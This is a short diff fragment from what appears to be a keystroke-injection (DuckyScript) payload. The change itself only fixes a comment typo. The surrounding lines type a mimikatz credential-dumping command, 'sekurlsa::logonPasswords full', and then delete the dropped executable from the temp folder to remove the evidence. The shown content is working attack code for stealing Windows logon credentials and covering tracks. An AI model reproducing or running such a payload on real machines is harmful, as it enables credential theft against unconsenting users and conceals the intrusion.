@@ -34,7 +34,7 @@ STRING sekurlsa::logonPasswords full
 ENTER
 STRING exit
 ENTER
-RE< --------- delete mimikatz
+REM< --------- delete mimikatz
 STRING del %TEMP%\pw.exe
 ENTER
 STRING exit
